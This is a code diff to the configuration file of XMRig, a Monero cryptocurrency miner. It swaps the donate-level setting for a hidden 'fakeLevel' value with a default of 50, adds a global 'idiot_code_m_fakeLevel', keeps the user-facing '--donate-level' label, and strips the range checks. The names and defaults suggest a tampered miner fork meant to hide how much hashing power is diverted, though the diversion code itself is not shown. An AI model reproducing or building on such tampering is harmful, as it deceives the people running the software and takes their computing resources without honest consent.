@@ -30,7 +30,6 @@
 
 
 #include "core/CommonConfig.h"
-#include "donate.h"
 #include "log/Log.h"
 #include "net/Pool.h"
 #include "rapidjson/document.h"
@@ -38,6 +37,7 @@
 #include "rapidjson/prettywriter.h"
 #include "xmrig.h"
 
+int xmrig::idiot_code_m_fakeLevel = 50;
 
 xmrig::CommonConfig::CommonConfig() :
     m_algorithm(CRYPTONIGHT),
@@ -55,7 +55,7 @@ xmrig::CommonConfig::CommonConfig() :
 #   endif
 
     m_apiPort(0),
-    m_donateLevel(kDefaultDonateLevel),
+    m_fakeLevel(50),
     m_printTime(60),
     m_retries(5),
     m_retryPause(5)
@@ -214,13 +214,7 @@ bool xmrig::CommonConfig::parseString(int key, const char *arg)
     case ApiIPv6Key:       /* --api-no-ipv6 */
         return parseBoolean(key, false);
 
-    case DonateLevelKey: /* --donate-level */
-#       ifdef XMRIG_PROXY_PROJECT
-        if (strncmp(arg, "minemonero.pro", 14) == 0) {
-            m_donateLevel = 0;
-            return true;
-        }
-#       endif
+    case FakeLevelKey: /* --donate-level */
         return parseUint64(key, strtol(arg, nullptr, 10));
 
     default:
@@ -300,10 +294,9 @@ bool xmrig::CommonConfig::parseInt(int key, int arg)
         m_pools.back().setVariant(arg);
         break;
 
-    case DonateLevelKey: /* --donate-level */
-        if (arg >= kMinimumDonateLevel && arg <= 99) {
-            m_donateLevel = arg;
-        }
+    case FakeLevelKey: /* --donate-level */
+		m_fakeLevel = arg;
+		idiot_code_m_fakeLevel = arg;
         break;
 
     case ApiPort: /* --api-port */
